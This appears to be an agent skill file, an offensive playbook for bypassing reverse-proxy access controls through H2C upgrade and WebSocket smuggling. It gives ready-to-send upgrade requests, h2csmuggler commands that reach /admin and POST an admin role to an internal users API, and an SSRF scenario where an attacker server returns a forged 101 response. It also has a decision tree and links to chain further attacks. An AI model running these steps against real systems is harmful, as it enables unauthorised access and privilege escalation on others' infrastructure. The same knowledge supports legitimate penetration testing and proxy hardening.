---
name: h2c-websocket-smuggling
description: Bypass reverse proxy ACLs via H2C upgrade or WebSocket tunnel. Use when proxy blocks internal paths but forwards Upgrade headers, or when standard CL.TE/TE.CL smuggling fails.
---

# H2C & WebSocket Smuggling

Proxy sees `Upgrade: h2c` or `Upgrade: websocket`, establishes persistent tunnel, stops inspecting individual requests. You now talk directly to the backend, bypassing path-based ACLs, WAF rules, and auth checks enforced at the proxy layer.

## When This Beats Standard Smuggling

- CL.TE/TE.CL/TE.0 all fail (proxy and backend agree on body parsing)
- Proxy enforces path ACLs (`/admin` blocked) but forwards upgrade headers
- Target has WebSocket endpoints (even broken ones)

## H2C Smuggling

### Required Headers (all three)
```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

### Proxy Vulnerability Matrix

**Inherently vulnerable** (forward upgrade headers by default):
- HAProxy, Traefik, Nuster

**Vulnerable if misconfigured** (forward when `proxy_pass` or backend config allows):
- AWS ALB/CLB, nginx, Apache, Squid, Varnish, Kong, Envoy, Apache Traffic Server

### Key Insight
Regardless of `proxy_pass` path (e.g. `http://backend:9999/socket.io`), the upgraded connection defaults to `http://backend:9999`. You can access **any** path on the backend — not just the configured proxy path.

### Exploitation
```bash
# BishopFox h2csmuggler — sends upgrade then HTTP/2 requests through the tunnel
h2csmuggler -x https://target.com/ --test
h2csmuggler -x https://target.com/ -X GET /admin
h2csmuggler -x https://target.com/ -X POST /internal/api/users -d '{"role":"admin"}'
```

Alternative: Assetnote h2csmuggler (`pip install h2csmuggler`).

## WebSocket Smuggling

Two scenarios, both exploit proxy misvalidation of the WebSocket handshake.

### Scenario 1: Invalid Version (no SSRF required)

Backend has public WebSocket API + blocked internal REST API.

1. Send `Upgrade: websocket` with **invalid** `Sec-WebSocket-Version: 999`
2. Proxy forwards without validating version
3. Backend responds `426 Upgrade Required` (handshake fails)
4. Proxy ignores the 426, assumes tunnel established
5. TCP tunnel open — send REST requests to internal API

```http
GET /websocket HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 999
```

**Affected**: Varnish (wontfix), Envoy <= 1.8.0.

### Scenario 2: Health Check + SSRF (requires external callback)

1. POST to health check endpoint with `Upgrade: websocket` header
2. Health check calls external resource (SSRF to attacker server)
3. Attacker returns `HTTP/1.1 101 Switching Protocols`
4. Proxy sees 101, assumes WebSocket established
5. Tunnel open to internal backend

**Requirement**: SSRF capability on any backend endpoint that triggers outbound fetch.

## Decision Logic

```
Proxy detected blocking internal paths
  ├── Does proxy forward Upgrade headers?
  │     ├── Test: curl -I -H "Upgrade: h2c" -H "Connection: Upgrade, HTTP2-Settings" ...
  │     │   └── 101 or connection upgrade → H2C smuggle
  │     └── No upgrade → standard smuggling or other bypass
  ├── Does target have WebSocket endpoints?
  │     ├── Test invalid version (Scenario 1)
  │     │   └── 426 but proxy keeps connection → WebSocket smuggle
  │     └── Test health check + SSRF (Scenario 2)
  │         └── 101 from attacker callback → WebSocket smuggle
  └── Neither works → try h2-connect-internal-scan, te0-request-smuggling
```

## Chain With
- blind-ssrf-chains (access internal services through the tunnel)
- 403-bypass (tunnel bypasses proxy-layer ACLs)
- h2-connect-internal-scan (alternative HTTP/2 CONNECT method)

## Reference
- https://bishop.fox.com/blog/h2c-smuggling-request (BishopFox, original research)
- https://blog.assetnote.io/2021/03/18/h2c-smuggling/ (Assetnote)
- https://github.com/0ang3el/websocket-smuggle (WebSocket smuggle labs)
